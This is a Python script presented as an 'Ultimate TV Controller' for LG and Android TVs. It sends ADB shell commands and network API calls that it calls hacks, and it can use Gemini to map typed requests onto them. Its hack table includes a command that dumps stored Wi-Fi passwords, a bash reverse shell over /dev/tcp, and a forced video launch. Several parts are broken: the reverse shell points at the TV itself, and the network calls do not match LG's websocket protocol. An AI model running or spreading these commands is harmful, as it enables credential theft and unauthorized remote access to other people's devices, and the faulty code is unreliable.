#!/usr/bin/env python3
"""
Ultimate TV Controller v6.2 - USB(❌IP) / Shizuku / Root / Network
LG TV Optimized | Single File | GitHub Ready
"""
import os
import sys
import json
import re
import socket
import requests
import subprocess
from urllib.parse import quote

def print_banner():
    print("🤖 ULTIMATE TV CONTROLLER v6.2")
    print("━" * 55)

print_banner()

# ================================
# SMART MODE SELECTOR
# ================================
print("\n🎯 CONNECTION MODE:")
print("1️⃣  USB Cable (NO IP NEEDED)")
print("2️⃣  Shizuku Wireless") 
print("3️⃣  Rooted Termux")
print("4️⃣  Wireless ADB")
print("5️⃣  Network Only (LG/Samsung)")
mode = input("Choose (1-5): ").strip()

MODES = {"1": "usb", "2": "shizuku", "3": "root", "4": "wireless_adb", "5": "network"}
ACCESS_MODE = MODES.get(mode, "network")

# ================================
# IP HANDLING - USB SKIPS IP
# ================================
TARGET_IP = None
DEVICE_ID = None

if ACCESS_MODE == "usb":
    print("\n🔌 USB MODE - Scanning devices...")
    result = subprocess.run("adb devices", shell=True, capture_output=True, text=True)
    print(result.stdout)
    
    devices = [line.split()[0] for line in result.stdout.splitlines()[1:] if "device" in line]
    if devices:
        DEVICE_ID = devices[0]  # Auto-pick first
        print(f"✅ USB Device: {DEVICE_ID}")
    else:
        print("❌ No USB devices. Enable USB Debugging on TV")
        sys.exit(1)
        
elif ACCESS_MODE in ["shizuku", "wireless_adb"]:
    TARGET_IP = input("📺 TV IP: ").strip()
    subprocess.run(f"adb connect {TARGET_IP}", shell=True)
    
elif ACCESS_MODE == "network":
    TARGET_IP = input("📺 TV IP (usually port 3000): ").strip()
    
print(f"\n🎯 Mode: {ACCESS_MODE.upper()} | {'USB:'+DEVICE_ID if DEVICE_ID else f'IP:{TARGET_IP}'}")

# ================================
# GEMINI AI (Optional Magic)
# ================================
GEMINI_API_KEY = input("\n🔑 Gemini API (blank=skip): ").strip()
AI_ACTIVE = False

if GEMINI_API_KEY:
    try:
        import google.generativeai as genai
        genai.configure(api_key=GEMINI_API_KEY)
        model = genai.GenerativeModel('gemini-1.5-flash')
        AI_ACTIVE = True
        print("✨ AI ACTIVATED!")
        
        # AI Personality
        ai_msg = model.generate_content("Greet me as TV hacking master! Short & cool.")
        print(f"🤖 {ai_msg.text}")
    except ImportError:
        print("⚠️ pip install google-generativeai")
    except:
        print("❌ AI Error - using keywords")

# ================================
# HACK DATABASE
# ================================
HACKS = {
    # Universal Network (LG/Samsung)
    "power off": {"type": "network", "method": "ssap://system/turnOff"},
    "volume up": {"type": "network", "method": "ssap://audio/volumeUp"},
    "volume max": {"type": "network", "method": "ssap://audio/setVolume", "params": {"volume": 100}},
    "mute": {"type": "network", "method": "ssap://audio/setMute", "params": {"mute": True}},
    "reboot": {"type": "network", "method": "ssap://system/reboot"},
    "home": {"type": "network", "method": "ssap://system/back"},
    
    # Shell Access (USB/Shizuku/Root/ADB)
    "shell": {"type": "shell", "cmd": "shell"},
    "wifi passwords": {"type": "shell", "cmd": "shell cat /data/misc/wifi/WifiConfigStore.xml"},
    "apps": {"type": "shell", "cmd": "shell pm list packages"},
    "cpu": {"type": "shell", "cmd": "shell cat /proc/cpuinfo"},
    "reverse shell": {"type": "shell", "cmd": "shell 'bash -i >& /dev/tcp/$(hostname -I|awk \"{print \$1}\")/4444 0>&1'"},
    
    # Root
    "su": {"type": "root", "cmd": "su"},
    
    # Fun
    "rickroll": {"type": "shell", "cmd": "shell am start -a android.intent.action.VIEW -d 'https://youtu.be/dQw4w9WgXcQ'"},
}

# ================================
# EXECUTION ENGINE
# ================================
def send_network(method, params=None):
    if not TARGET_IP: return False
    url = f"http://{TARGET_IP}:3000/"
    payload = {"method": method}
    if params: payload["params"] = params
    try:
        r = requests.post(url, json=payload, timeout=3)
        return r.status_code in [200, 204]
    except: return False

def exec_shell(cmd):
    if ACCESS_MODE == "usb":
        full_cmd = f"adb -s {DEVICE_ID} {cmd}"
    elif ACCESS_MODE == "shizuku":
        full_cmd = f"shizuku adb connect {TARGET_IP} && shizuku adb {cmd}"
    else:
        full_cmd = f"adb connect {TARGET_IP} && adb {cmd}"
    
    result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
    print(f"{'✅' if result.returncode == 0 else '❌'} {cmd.split()[0]}")
    if result.stdout: print(result.stdout[:200])
    return result.returncode == 0

def ai_parse(cmd):
    if not AI_ACTIVE: return None
    
    prompt = f'Parse "{cmd}" → exact key: {list(HACKS.keys())}'
    try:
        resp = model.generate_content(prompt)
        match = re.search(r'"hack":"([^"]+)"', resp.text) or re.search(r'"([^"]+)"', resp.text)
        if match:
            key = match.group(1).lower()
            return HACKS.get(key)
    except: pass
    return None

# ================================
# MAIN LOOP
# ================================
print("\n📱 Commands: power off, shell, wifi passwords, rickroll...")
print("🔧: list, test, quit")
print("━" * 55)

while True:
    cmd = input("📺> ").strip()
    
    if cmd.lower() in ["quit", "q"]: 
        print("👋 Offline")
        break
    elif cmd.lower() == "list":
        print("\n".join(f"  {k}" for k in HACKS.keys()))
    elif cmd.lower() == "test":
        if ACCESS_MODE == "usb":
            exec_shell("shell echo USB_OK")
        else:
            send_network("ssap://system/info")
    else:
        hack = ai_parse(cmd) if AI_ACTIVE else None
        if not hack:
            cmd_clean = cmd.lower().replace(" ", "")
            for key, h in HACKS.items():
                if key.replace(" ", "") in cmd_clean:
                    hack = h
                    break
        
        if hack:
            if hack["type"] == "network":
                success = send_network(hack["method"], hack.get("params"))
                print(f"🌐 {'✅' if success else '❌'} Network API")
            elif hack["type"] == "shell":
                exec_shell(hack["cmd"])
            elif hack["type"] == "root":
                subprocess.run(f"su -c '{hack['cmd']}'", shell=True)
        else:
            print("❌ Unknown. Try 'list'")
